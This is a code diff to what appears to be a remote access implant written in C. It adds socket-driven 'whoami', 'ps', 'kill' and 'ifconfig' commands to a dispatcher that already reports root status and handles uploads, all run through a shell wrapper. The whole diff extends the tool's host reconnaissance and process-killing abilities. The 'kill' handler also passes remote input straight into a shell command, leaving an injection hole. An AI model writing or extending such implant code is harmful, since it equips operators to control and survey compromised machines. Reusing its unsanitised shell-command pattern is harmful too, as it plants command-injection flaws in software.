@@ -346,9 +346,44 @@ static int dispatch(socket_t s, const char *json) {
     }
     else if (strcmp(cmd, "check_admin") == 0) {
 #ifdef _WIN32
-        response = format_json_response("[-] Not root");
+        response = format_json_response("[-] Not admin");
 #else
         response = format_json_response(geteuid() == 0 ? "[+] Root" : "[-] Not root");
+#endif
+    }
+    else if (strcmp(cmd, "whoami") == 0) {
+#ifdef _WIN32
+        char user[256]; DWORD size = sizeof(user);
+        if (GetUserNameA(user, &size))
+            response = format_json_response(user);
+        else
+            response = format_json_response("unknown");
+#else
+        char *u = getenv("USER");
+        response = format_json_response(u ? u : "unknown");
+#endif
+    }
+    else if (strcmp(cmd, "ps") == 0) {
+#ifdef _WIN32
+        response = cmd_shell("tasklist 2>&1");
+#else
+        response = cmd_shell("ps aux 2>&1");
+#endif
+    }
+    else if (strncmp(cmd, "kill ", 5) == 0) {
+        char buf[512];
+#ifdef _WIN32
+        snprintf(buf, sizeof(buf), "taskkill /F /PID %s 2>&1", cmd + 5);
+#else
+        snprintf(buf, sizeof(buf), "kill -9 %s 2>&1", cmd + 5);
+#endif
+        response = cmd_shell(buf);
+    }
+    else if (strcmp(cmd, "ifconfig") == 0 || strcmp(cmd, "ip addr") == 0) {
+#ifdef _WIN32
+        response = cmd_shell("ipconfig 2>&1");
+#else
+        response = cmd_shell("ifconfig 2>&1");
 #endif
     }
     else if (strncmp(cmd, "upload ", 7) == 0) {
